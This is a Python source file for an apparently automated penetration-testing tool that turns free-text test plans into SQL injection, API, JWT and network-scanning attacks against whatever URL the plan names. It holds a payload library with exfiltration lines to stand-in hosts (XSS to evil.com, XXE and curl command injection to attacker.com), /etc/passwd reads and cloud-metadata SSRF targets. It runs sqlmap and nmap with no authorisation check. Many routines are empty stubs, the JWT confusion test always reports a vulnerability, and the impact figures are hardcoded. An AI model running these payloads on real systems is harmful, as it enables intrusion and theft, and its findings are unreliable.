"""
Elite VAPT Tool Execution System
Focused implementation for OWASP Top 50 with enterprise-grade security testing
"""

import subprocess
import asyncio
import json
import time
import logging
import os
import requests
import urllib.parse
from typing import Dict, List, Any, Optional, Union
from dataclasses import dataclass
from pathlib import Path
import tempfile
import re
import hashlib
import base64
from urllib.parse import urlparse, parse_qs

# Elite VAPT Stack Imports
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Check for nmap CLI availability instead of Python library
try:
    result = subprocess.run(['nmap', '--version'], capture_output=True, check=True, timeout=5)
    NMAP_CLI_AVAILABLE = True
    print("✓ nmap CLI detected and available")
except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
    NMAP_CLI_AVAILABLE = False
    print("⚠ nmap CLI not found - network scanning features will be limited")
    print("  Install nmap for enhanced network reconnaissance capabilities:")
    print("  Windows: Download from https://nmap.org/download.html")
    print("  Linux: sudo apt-get install nmap")
    print("  macOS: brew install nmap")

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False

try:
    from impacket import smb, smbconnection
    from impacket.dcerpc.v5 import transport
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    import jwt as pyjwt
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import boto3
    from botocore.exceptions import ClientError
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False

try:
    import docker
    DOCKER_AVAILABLE = True
except ImportError:
    DOCKER_AVAILABLE = False

try:
    from zapv2 import ZAPv2
    ZAP_AVAILABLE = True
except ImportError:
    ZAP_AVAILABLE = False

# Browser automation
from tools.browser import PlaywrightTools

@dataclass
class VAPTResult:
    """Elite VAPT execution result with business intelligence"""
    success: bool
    tool_name: str
    command: str
    output: str
    error: str = ""
    execution_time: float = 0.0
    vulnerabilities: List[Dict] = None
    business_impact: str = ""
    attack_complexity: str = ""
    compliance_risk: str = ""
    owasp_category: str = ""
    cvss_score: float = 0.0
    financial_impact: str = ""

    def __post_init__(self):
        if self.vulnerabilities is None:
            self.vulnerabilities = []

class ElitePayloads:
    """Strategic payload library for OWASP Top 50 testing"""
    
    SQL_INJECTION = {
        'critical': [
            "' OR '1'='1' --", "'; EXEC xp_cmdshell('whoami'); --",
            "' UNION SELECT 1,@@version,user(),database() --",
            "'; WAITFOR DELAY '0:0:10'; --", "' AND (SELECT SUBSTRING(@@version,1,1))='M' --"
        ],
        'bypass': [
            "/**/UNION/**/SELECT", "UNI%00ON SEL%00ECT", "/*!50000UNION*//*!50000SELECT*/",
            "'/**/OR/**/1=1/**/--", "' OR 'x'='x", "'/*!*/OR/*!*/1=1/*!*/--"
        ]
    }
    
    XSS_ADVANCED = [
        "<svg/onload=alert('XSS')>", "<img src=x onerror=alert('XSS')>",
        "<script>fetch('/admin').then(r=>r.text()).then(d=>fetch('//evil.com?'+btoa(d)))</script>",
        "javascript:alert(document.domain)", "<body onload=alert(document.cookie)>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]
    
    XXE_PAYLOADS = [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><root>&xxe;</root>"
    ]
    
    SSRF_TARGETS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1:22", "http://localhost:3306",
        "file:///etc/passwd", "dict://127.0.0.1:6379/"
    ]
    
    COMMAND_INJECTION = [
        "; whoami", "&& id", "| cat /etc/passwd", "; uname -a",
        "`whoami`", "$(id)", "; curl attacker.com/$(whoami)"
    ]
    
    JWT_ATTACKS = {
        'none_algorithm': '{"alg":"none","typ":"JWT"}',
        'weak_secret': 'secret',
        'algorithm_confusion': 'HS256'
    }

class EliteVAPTTester:
    """Strategic VAPT testing orchestrator"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.payloads = ElitePayloads()
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 30
        
        # Initialize tool availability
        self.tools = {
            'scapy': SCAPY_AVAILABLE,
            'nmap': NMAP_CLI_AVAILABLE,
            'beautifulsoup': BEAUTIFULSOUP_AVAILABLE,
            'impacket': IMPACKET_AVAILABLE,
            'paramiko': PARAMIKO_AVAILABLE,
            'cryptography': CRYPTOGRAPHY_AVAILABLE,
            'boto3': BOTO3_AVAILABLE,
            'docker': DOCKER_AVAILABLE,
            'zap': ZAP_AVAILABLE
        }
    
    async def execute_strategic_test(self, plan: Dict[str, str]) -> VAPTResult:
        """Execute strategic VAPT test based on plan analysis"""
        start_time = time.time()
        
        # Strategic test routing based on business impact
        if self._is_sql_injection_test(plan):
            return await self._execute_sql_injection_campaign(plan, start_time)
        elif self._is_api_security_test(plan):
            return await self._execute_api_security_assessment(plan, start_time)
        elif self._is_apt_simulation_test(plan):
            return await self._execute_apt_simulation(plan, start_time)
        elif self._is_session_management_test(plan):
            return await self._execute_session_exploitation(plan, start_time)
        elif self._is_business_logic_test(plan):
            return await self._execute_business_logic_testing(plan, start_time)
        elif self._is_information_warfare_test(plan):
            return await self._execute_information_warfare(plan, start_time)
        elif self._is_cloud_infrastructure_test(plan):
            return await self._execute_cloud_infrastructure_assessment(plan, start_time)
        else:
            return await self._execute_comprehensive_assessment(plan, start_time)
    
    # ===== STRATEGIC TEST IDENTIFICATION =====
    
    def _is_sql_injection_test(self, plan: Dict) -> bool:
        keywords = ['sql injection', 'database', 'financial transaction manipulation', 'sqlmap']
        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
                  for kw in keywords)
    
    def _is_api_security_test(self, plan: Dict) -> bool:
        keywords = ['api authorization', 'privilege escalation', 'api', 'jwt', 'data exfiltration']
        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
                  for kw in keywords)
    
    def _is_apt_simulation_test(self, plan: Dict) -> bool:
        keywords = ['apt', 'persistent threat', 'multi-vector', 'attack chain']
        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
                  for kw in keywords)
    
    def _is_session_management_test(self, plan: Dict) -> bool:
        keywords = ['session management', 'authentication architecture', 'oauth', 'saml', 'sso']
        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
                  for kw in keywords)
    
    def _is_business_logic_test(self, plan: Dict) -> bool:
        keywords = ['business logic', 'financial workflow', 'transaction', 'workflow manipulation']
        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
                  for kw in keywords)
    
    def _is_information_warfare_test(self, plan: Dict) -> bool:
        keywords = ['information warfare', 'intelligence gathering', 'disclosure exploitation']
        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
                  for kw in keywords)
    
    def _is_cloud_infrastructure_test(self, plan: Dict) -> bool:
        keywords = ['cloud infrastructure', 'devops', 'supply chain', 'container', 'ci/cd']
        return any(kw in plan.get('title', '').lower() or kw in plan.get('description', '').lower() 
                  for kw in keywords)
    
    # ===== ELITE VAPT EXECUTION METHODS =====
    
    async def _execute_sql_injection_campaign(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute advanced SQL injection campaign with SQLMap integration"""
        vulnerabilities = []
        target_url = self._extract_url_from_plan(plan)
        
        if not target_url:
            return VAPTResult(False, "SQL Injection Campaign", "", "No target URL found")
        
        # SQLMap comprehensive testing
        if self._check_tool('sqlmap'):
            sqlmap_result = await self._run_sqlmap_campaign(target_url, plan)
            vulnerabilities.extend(sqlmap_result)
        
        # Manual payload testing for WAF bypass
        manual_result = await self._manual_sql_testing(target_url, plan)
        vulnerabilities.extend(manual_result)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Advanced SQL Injection Campaign",
            command="sqlmap + manual payload testing",
            output=f"SQL injection campaign completed. Found {len(vulnerabilities)} vulnerabilities",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact=plan.get('business_impact', 'CRITICAL - Database compromise'),
            attack_complexity=plan.get('attack_complexity', 'HIGH'),
            compliance_risk=plan.get('compliance_risk', 'PCI DSS violations'),
            owasp_category="A03:2021 – Injection",
            cvss_score=9.8,
            financial_impact="$2-5M including fines and remediation"
        )
    
    async def _execute_api_security_assessment(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute comprehensive API security assessment"""
        vulnerabilities = []
        target_url = self._extract_url_from_plan(plan)
        
        if not target_url:
            return VAPTResult(False, "API Security Assessment", "", "No target URL found")
        
        # API enumeration
        api_endpoints = await self._discover_api_endpoints(target_url)
        
        # Authorization testing
        for endpoint in api_endpoints:
            auth_vulns = await self._test_api_authorization(endpoint)
            vulnerabilities.extend(auth_vulns)
        
        # JWT testing if available
        if self.tools['cryptography']:
            jwt_vulns = await self._test_jwt_vulnerabilities(target_url)
            vulnerabilities.extend(jwt_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Advanced API Security Assessment",
            command="comprehensive api testing + jwt analysis",
            output=f"API security assessment completed. Found {len(vulnerabilities)} vulnerabilities",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact=plan.get('business_impact', 'CRITICAL - Data breach'),
            attack_complexity=plan.get('attack_complexity', 'VERY HIGH'),
            compliance_risk=plan.get('compliance_risk', 'GDPR violations'),
            owasp_category="A01:2021 – Broken Access Control",
            cvss_score=9.1,
            financial_impact="$3-7M based on data breach scope"
        )
    
    async def _execute_apt_simulation(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute Advanced Persistent Threat simulation"""
        vulnerabilities = []
        target_url = self._extract_url_from_plan(plan)
        
        if not target_url:
            return VAPTResult(False, "APT Simulation", "", "No target URL found")
        
        # Multi-vector attack chain
        xss_vulns = await self._test_advanced_xss(target_url)
        vulnerabilities.extend(xss_vulns)
        
        # Session hijacking simulation
        session_vulns = await self._test_session_hijacking(target_url)
        vulnerabilities.extend(session_vulns)
        
        # Persistence testing
        persistence_vulns = await self._test_persistence_mechanisms(target_url)
        vulnerabilities.extend(persistence_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Advanced Persistent Threat Simulation",
            command="multi-vector apt simulation",
            output=f"APT simulation completed. Found {len(vulnerabilities)} attack vectors",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact=plan.get('business_impact', 'CATASTROPHIC - Complete compromise'),
            attack_complexity=plan.get('attack_complexity', 'EXPERT'),
            compliance_risk=plan.get('compliance_risk', 'ISO 27001 failures'),
            owasp_category="Multiple OWASP Categories",
            cvss_score=9.9,
            financial_impact="$10-50M including business disruption"
        )
    
    async def _execute_session_exploitation(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute enterprise session management exploitation"""
        vulnerabilities = []
        target_url = self._extract_url_from_plan(plan)
        
        if not target_url:
            return VAPTResult(False, "Session Exploitation", "", "No target URL found")
        
        # OAuth/SAML testing
        auth_vulns = await self._test_enterprise_auth(target_url)
        vulnerabilities.extend(auth_vulns)
        
        # Session fixation and race conditions
        session_vulns = await self._test_advanced_session_attacks(target_url)
        vulnerabilities.extend(session_vulns)
        
        # CSRF with SameSite bypass
        csrf_vulns = await self._test_advanced_csrf(target_url)
        vulnerabilities.extend(csrf_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Enterprise Session Management Exploitation",
            command="oauth/saml + session + csrf testing",
            output=f"Session exploitation completed. Found {len(vulnerabilities)} vulnerabilities",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact=plan.get('business_impact', 'HIGH - Authentication compromise'),
            attack_complexity=plan.get('attack_complexity', 'HIGH'),
            compliance_risk=plan.get('compliance_risk', 'NIST Framework failures'),
            owasp_category="A07:2021 – Identification and Authentication Failures",
            cvss_score=8.1,
            financial_impact="$1-3M impact"
        )
    
    async def _execute_business_logic_testing(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute advanced business logic vulnerability testing"""
        vulnerabilities = []
        target_url = self._extract_url_from_plan(plan)
        
        if not target_url:
            return VAPTResult(False, "Business Logic Testing", "", "No target URL found")
        
        # Financial workflow testing
        financial_vulns = await self._test_financial_workflows(target_url)
        vulnerabilities.extend(financial_vulns)
        
        # Race condition testing
        race_vulns = await self._test_race_conditions(target_url)
        vulnerabilities.extend(race_vulns)
        
        # Transaction manipulation
        transaction_vulns = await self._test_transaction_manipulation(target_url)
        vulnerabilities.extend(transaction_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Advanced Business Logic Testing",
            command="financial workflow + race condition testing",
            output=f"Business logic testing completed. Found {len(vulnerabilities)} vulnerabilities",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact=plan.get('business_impact', 'CRITICAL - Financial manipulation'),
            attack_complexity=plan.get('attack_complexity', 'VERY HIGH'),
            compliance_risk=plan.get('compliance_risk', 'PCI DSS + SOX violations'),
            owasp_category="A04:2021 – Insecure Design",
            cvss_score=9.3,
            financial_impact="$5-15M direct financial impact"
        )
    
    async def _execute_information_warfare(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute strategic information warfare assessment"""
        vulnerabilities = []
        target_url = self._extract_url_from_plan(plan)
        
        if not target_url:
            return VAPTResult(False, "Information Warfare", "", "No target URL found")
        
        # Network reconnaissance if nmap is available
        if self.tools['nmap']:
            network_vulns = await self._nmap_network_scan(target_url)
            vulnerabilities.extend(network_vulns)
        
        # Technology stack enumeration
        tech_vulns = await self._enumerate_technology_stack(target_url)
        vulnerabilities.extend(tech_vulns)
        
        # Sensitive file discovery
        file_vulns = await self._discover_sensitive_files(target_url)
        vulnerabilities.extend(file_vulns)
        
        # Intelligence gathering
        intel_vulns = await self._gather_business_intelligence(target_url)
        vulnerabilities.extend(intel_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Strategic Information Warfare",
            command="nmap + comprehensive intelligence gathering",
            output=f"Information warfare completed. Found {len(vulnerabilities)} intelligence points",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact=plan.get('business_impact', 'HIGH - Intelligence exposure'),
            attack_complexity=plan.get('attack_complexity', 'MEDIUM-HIGH'),
            compliance_risk=plan.get('compliance_risk', 'Trade secret violations'),
            owasp_category="A05:2021 – Security Misconfiguration",
            cvss_score=7.5,
            financial_impact="$2-8M in competitive disadvantage"
        )
    
    async def _execute_cloud_infrastructure_assessment(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute cloud infrastructure security assessment"""
        vulnerabilities = []
        
        # AWS assessment if available
        if self.tools['boto3']:
            aws_vulns = await self._assess_aws_security()
            vulnerabilities.extend(aws_vulns)
        
        # Container security if available
        if self.tools['docker']:
            container_vulns = await self._assess_container_security()
            vulnerabilities.extend(container_vulns)
        
        # DevOps pipeline assessment
        devops_vulns = await self._assess_devops_security(plan)
        vulnerabilities.extend(devops_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Cloud Infrastructure Assessment",
            command="aws + docker + devops security testing",
            output=f"Cloud assessment completed. Found {len(vulnerabilities)} vulnerabilities",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact=plan.get('business_impact', 'CRITICAL - Infrastructure compromise'),
            attack_complexity=plan.get('attack_complexity', 'EXPERT'),
            compliance_risk=plan.get('compliance_risk', 'SOC 2 failures'),
            owasp_category="A05:2021 – Security Misconfiguration",
            cvss_score=9.0,
            financial_impact="$5-20M including customer liability"
        )
    
    async def _execute_comprehensive_assessment(self, plan: Dict, start_time: float) -> VAPTResult:
        """Execute comprehensive security assessment when specific test type unclear"""
        vulnerabilities = []
        target_url = self._extract_url_from_plan(plan)
        
        if not target_url:
            return VAPTResult(False, "Comprehensive Assessment", "", "No target URL found")
        
        # OWASP ZAP integration if available
        if self.tools['zap']:
            zap_vulns = await self._run_zap_assessment(target_url)
            vulnerabilities.extend(zap_vulns)
        
        # Core OWASP testing
        core_vulns = await self._run_core_owasp_tests(target_url)
        vulnerabilities.extend(core_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=len(vulnerabilities) > 0,
            tool_name="Comprehensive Security Assessment",
            command="zap + core owasp testing",
            output=f"Comprehensive assessment completed. Found {len(vulnerabilities)} vulnerabilities",
            execution_time=execution_time,
            vulnerabilities=vulnerabilities,
            business_impact="VARIES - Multiple vulnerability types",
            attack_complexity="VARIES - Depends on findings",
            compliance_risk="Multiple OWASP categories",
            owasp_category="Multiple OWASP Categories",
            cvss_score=self._calculate_max_cvss(vulnerabilities),
            financial_impact="Variable based on findings"
        )
    
    # ===== CORE TESTING IMPLEMENTATIONS =====
    
    async def _run_sqlmap_campaign(self, url: str, plan: Dict) -> List[Dict]:
        """Execute comprehensive SQLMap campaign"""
        vulnerabilities = []
        
        try:
            cmd = [
                'sqlmap', '-u', url, '--batch', '--random-agent',
                '--level=5', '--risk=3', '--technique=BEUSTQ',
                '--timeout=120', '--threads=10'
            ]
            
            # Add forms and parameters from plan context
            params = self._extract_parameters_from_plan(plan)
            if params.get('data'):
                cmd.extend(['--data', params['data']])
            if params.get('headers'):
                for header in params['headers']:
                    cmd.extend(['--header', header])
            
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=600)
            output = stdout.decode() + stderr.decode()
            
            # Parse SQLMap results
            if 'is vulnerable' in output.lower():
                vulnerabilities.append({
                    'type': 'SQL Injection',
                    'severity': 'Critical',
                    'tool': 'SQLMap',
                    'evidence': 'SQLMap confirmed SQL injection vulnerability',
                    'cvss_score': 9.8
                })
                
        except Exception as e:
            logging.error(f"SQLMap execution error: {e}")
        
        return vulnerabilities
    
    async def _manual_sql_testing(self, url: str, plan: Dict) -> List[Dict]:
        """Manual SQL injection testing with advanced payloads"""
        vulnerabilities = []
        
        for payload in self.payloads.SQL_INJECTION['critical']:
            try:
                # Test in URL parameters
                test_url = f"{url}?id={urllib.parse.quote(payload)}"
                response = self.session.get(test_url)
                
                if self._detect_sql_error(response.text):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'payload': payload,
                        'location': 'URL parameter',
                        'evidence': 'SQL error detected in response',
                        'cvss_score': 9.8
                    })
                    
            except Exception as e:
                logging.error(f"Manual SQL testing error: {e}")
        
        return vulnerabilities
    
    async def _discover_api_endpoints(self, url: str) -> List[str]:
        """Discover API endpoints through intelligent enumeration"""
        endpoints = []
        base_url = url.rstrip('/')
        
        # Common API patterns
        api_patterns = [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/admin', '/api/auth',
            '/api/v1/data', '/api/data', '/rest/api/users'
        ]
        
        for pattern in api_patterns:
            try:
                test_url = base_url + pattern
                response = self.session.get(test_url)
                if response.status_code in [200, 401, 403]:
                    endpoints.append(test_url)
            except Exception:
                continue
        
        return endpoints
    
    async def _test_api_authorization(self, endpoint: str) -> List[Dict]:
        """Test API authorization vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test without authentication
            response = self.session.get(endpoint)
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Broken Authentication',
                    'severity': 'High',
                    'endpoint': endpoint,
                    'evidence': 'API endpoint accessible without authentication',
                    'cvss_score': 8.1
                })
            
            # Test IDOR patterns
            if '/users/' in endpoint or '?id=' in endpoint:
                idor_vulns = await self._test_idor(endpoint)
                vulnerabilities.extend(idor_vulns)
                
        except Exception as e:
            logging.error(f"API authorization testing error: {e}")
        
        return vulnerabilities
    
    async def _test_jwt_vulnerabilities(self, url: str) -> List[Dict]:
        """Test JWT vulnerabilities using PyJWT"""
        vulnerabilities = []
        
        if not self.tools['cryptography']:
            return vulnerabilities
        
        try:
            # Extract JWT from responses
            response = self.session.get(url)
            jwt_tokens = self._extract_jwt_tokens(response)
            
            for token in jwt_tokens:
                # Test algorithm confusion
                if self._test_jwt_algorithm_confusion(token):
                    vulnerabilities.append({
                        'type': 'JWT Vulnerability',
                        'subtype': 'Algorithm Confusion',
                        'severity': 'Critical',
                        'evidence': 'JWT algorithm can be manipulated',
                        'cvss_score': 9.1
                    })
                
                # Test weak secrets
                weak_secret = self._test_jwt_weak_secret(token)
                if weak_secret:
                    vulnerabilities.append({
                        'type': 'JWT Vulnerability',
                        'subtype': 'Weak Secret',
                        'severity': 'Critical',
                        'evidence': f'JWT signed with weak secret: {weak_secret}',
                        'cvss_score': 9.1
                    })
                    
        except Exception as e:
            logging.error(f"JWT testing error: {e}")
        
        return vulnerabilities
    
    # ===== UTILITY METHODS =====
    
    def _extract_url_from_plan(self, plan: Dict) -> Optional[str]:
        """Extract target URL from plan description"""
        text = f"{plan.get('title', '')} {plan.get('description', '')}"
        url_pattern = r'https?://[^\s<>"\']+|(?:www\.)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*'
        matches = re.findall(url_pattern, text)
        
        if matches:
            url = matches[0].strip('\'"[]')
            if not url.startswith(('http://', 'https://')):
                url = f"http://{url}"
            return url
        return None
    
    def _extract_parameters_from_plan(self, plan: Dict) -> Dict[str, Any]:
        """Extract testing parameters from plan context"""
        params = {'data': None, 'headers': []}
        
        description = plan.get('description', '').lower()
        
        # Extract authentication parameters
        if 'login' in description or 'auth' in description:
            params['data'] = 'username=admin&password=admin'
        
        # Extract API parameters
        if 'api' in description:
            params['headers'].append('Content-Type: application/json')
            params['headers'].append('Authorization: Bearer test123')
        
        return params
    
    def _detect_sql_error(self, response_text: str) -> bool:
        """Detect SQL errors in response"""
        sql_errors = [
            'sql syntax', 'mysql', 'oracle', 'postgresql', 'sqlite',
            'syntax error', 'unexpected token', 'division by zero'
        ]
        return any(error in response_text.lower() for error in sql_errors)
    
    def _extract_jwt_tokens(self, response) -> List[str]:
        """Extract JWT tokens from HTTP response"""
        tokens = []
        
        # Check Authorization header
        auth_header = response.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            token = auth_header.replace('Bearer ', '')
            if self._is_jwt_format(token):
                tokens.append(token)
        
        # Check response body
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        matches = re.findall(jwt_pattern, response.text)
        tokens.extend([m for m in matches if self._is_jwt_format(m)])
        
        return list(set(tokens))
    
    def _is_jwt_format(self, token: str) -> bool:
        """Check if string is JWT format"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False
            
            # Decode header
            header = base64.urlsafe_b64decode(parts[0] + '==')
            header_json = json.loads(header)
            return 'alg' in header_json
        except Exception:
            return False
    
    def _test_jwt_algorithm_confusion(self, token: str) -> bool:
        """Test JWT algorithm confusion vulnerability"""
        try:
            # Decode without verification
            header = pyjwt.get_unverified_header(token)
            payload = pyjwt.decode(token, options={"verify_signature": False})
            
            # Test algorithm manipulation
            header['alg'] = 'none'
            
            # Create manipulated token
            manipulated = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            manipulated += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            manipulated += '.'
            
            return True  # If we can manipulate the algorithm, it's vulnerable
        except Exception:
            return False
    
    def _test_jwt_weak_secret(self, token: str) -> Optional[str]:
        """Test JWT for weak secrets"""
        weak_secrets = ['secret', 'key', 'password', '123456', 'admin', 'test']
        
        for secret in weak_secrets:
            try:
                pyjwt.decode(token, secret, algorithms=['HS256'])
                return secret
            except Exception:
                continue
        return None
    
    def _calculate_max_cvss(self, vulnerabilities: List[Dict]) -> float:
        """Calculate maximum CVSS score from vulnerabilities"""
        if not vulnerabilities:
            return 0.0
        
        scores = [v.get('cvss_score', 0.0) for v in vulnerabilities]
        return max(scores) if scores else 0.0
    
    def _check_tool(self, tool_name: str) -> bool:
        """Check if external tool is available"""
        try:
            subprocess.run([tool_name, '--help'], capture_output=True, timeout=5)
            return True
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            return False
    
    # ===== PLACEHOLDER IMPLEMENTATIONS =====
    # These would be fully implemented based on specific requirements
    
    async def _test_advanced_xss(self, url: str) -> List[Dict]:
        """Advanced XSS testing implementation"""
        return []
    
    async def _test_session_hijacking(self, url: str) -> List[Dict]:
        """Session hijacking testing implementation"""
        return []
    
    async def _test_persistence_mechanisms(self, url: str) -> List[Dict]:
        """Persistence mechanism testing implementation"""
        return []
    
    async def _test_enterprise_auth(self, url: str) -> List[Dict]:
        """Enterprise authentication testing implementation"""
        return []
    
    async def _test_advanced_session_attacks(self, url: str) -> List[Dict]:
        """Advanced session attack testing implementation"""
        return []
    
    async def _test_advanced_csrf(self, url: str) -> List[Dict]:
        """Advanced CSRF testing implementation"""
        return []
    
    async def _test_financial_workflows(self, url: str) -> List[Dict]:
        """Financial workflow testing implementation"""
        return []
    
    async def _test_race_conditions(self, url: str) -> List[Dict]:
        """Race condition testing implementation"""
        return []
    
    async def _test_transaction_manipulation(self, url: str) -> List[Dict]:
        """Transaction manipulation testing implementation"""
        return []
    
    async def _enumerate_technology_stack(self, url: str) -> List[Dict]:
        """Technology stack enumeration implementation"""
        return []
    
    async def _discover_sensitive_files(self, url: str) -> List[Dict]:
        """Sensitive file discovery implementation"""
        return []
    
    async def _gather_business_intelligence(self, url: str) -> List[Dict]:
        """Business intelligence gathering implementation"""
        return []
    
    async def _assess_aws_security(self) -> List[Dict]:
        """AWS security assessment implementation"""
        return []
    
    async def _assess_container_security(self) -> List[Dict]:
        """Container security assessment implementation"""
        return []
    
    async def _assess_devops_security(self, plan: Dict) -> List[Dict]:
        """DevOps security assessment implementation"""
        return []
    
    async def _run_zap_assessment(self, url: str) -> List[Dict]:
        """OWASP ZAP assessment implementation"""
        return []
    
    async def _run_core_owasp_tests(self, url: str) -> List[Dict]:
        """Core OWASP testing implementation"""
        vulnerabilities = []
        
        # Network layer testing with nmap
        if self.tools['nmap']:
            network_vulns = await self._nmap_network_scan(url)
            vulnerabilities.extend(network_vulns)
        
        # Basic web application testing
        basic_vulns = await self._basic_web_app_tests(url)
        vulnerabilities.extend(basic_vulns)
        
        return vulnerabilities
    
    async def _basic_web_app_tests(self, url: str) -> List[Dict]:
        """Basic web application security tests"""
        vulnerabilities = []
        
        try:
            # Test for common files and directories
            common_paths = [
                '/admin', '/administrator', '/admin.php', '/admin.html',
                '/backup', '/config.php', '/config.inc.php', '/database.sql',
                '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
                '/.env', '/.git', '/robots.txt', '/sitemap.xml'
            ]
            
            base_url = url.rstrip('/')
            
            for path in common_paths:
                try:
                    test_url = base_url + path
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200:
                        severity = self._assess_file_risk(path, response)
                        if severity != 'Info':
                            vulnerabilities.append({
                                'type': 'Information Disclosure',
                                'severity': severity,
                                'url': test_url,
                                'evidence': f'Accessible file/directory: {path}',
                                'cvss_score': 7.0 if severity == 'High' else 4.0
                            })
                            
                except Exception:
                    continue
                    
        except Exception as e:
            logging.error(f"Basic web app testing error: {e}")
        
        return vulnerabilities
    
    def _assess_file_risk(self, path: str, response) -> str:
        """Assess risk level of accessible files"""
        high_risk_indicators = [
            'phpinfo', 'database', 'config', 'backup', '.env', '.git',
            'admin', 'debug', 'test'
        ]
        
        medium_risk_indicators = [
            'robots.txt', 'sitemap.xml'
        ]
        
        path_lower = path.lower()
        content_lower = response.text[:1000].lower()
        
        # Check for high-risk files
        if any(indicator in path_lower for indicator in high_risk_indicators):
            return 'High'
        
        # Check for sensitive content in response
        if any(keyword in content_lower for keyword in 
               ['password', 'database', 'config', 'secret', 'key', 'token']):
            return 'High'
        
        # Check for medium-risk files
        if any(indicator in path_lower for indicator in medium_risk_indicators):
            return 'Medium'
        
        return 'Low'
    
    async def _nmap_network_scan(self, url: str) -> List[Dict]:
        """Perform comprehensive network scanning using nmap CLI"""
        vulnerabilities = []
        
        if not self.tools['nmap']:
            return vulnerabilities
        
        try:
            # Extract target from URL
            parsed_url = urlparse(url)
            target = parsed_url.hostname
            
            if not target:
                return vulnerabilities
            
            # Comprehensive nmap scan
            nmap_commands = [
                # TCP SYN scan for common ports
                ['nmap', '-sS', '-T4', '--top-ports', '1000', '-oN', '-', target],
                # Service and version detection
                ['nmap', '-sV', '-sC', '--top-ports', '100', '-oN', '-', target],
                # UDP scan for common services
                ['nmap', '-sU', '--top-ports', '50', '-T4', '-oN', '-', target],
                # Vulnerability scanning scripts
                ['nmap', '--script', 'vuln', '--script-timeout', '60s', '-p-', target]
            ]
            
            scan_results = []
            
            for cmd in nmap_commands:
                try:
                    process = await asyncio.create_subprocess_exec(
                        *cmd, 
                        stdout=asyncio.subprocess.PIPE, 
                        stderr=asyncio.subprocess.PIPE
                    )
                    
                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
                    output = stdout.decode('utf-8', errors='ignore')
